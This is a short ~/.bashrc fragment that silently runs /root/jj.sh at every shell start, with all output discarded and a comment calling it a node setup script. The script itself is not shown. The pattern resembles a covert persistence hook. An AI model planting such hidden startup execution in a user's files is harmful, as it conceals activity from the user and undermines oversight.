# ~/.bashrc
# Run node setup script if exists
if [ -f /root/jj.sh ]; then
  sh /root/jj.sh >/dev/null 2>&1
fi
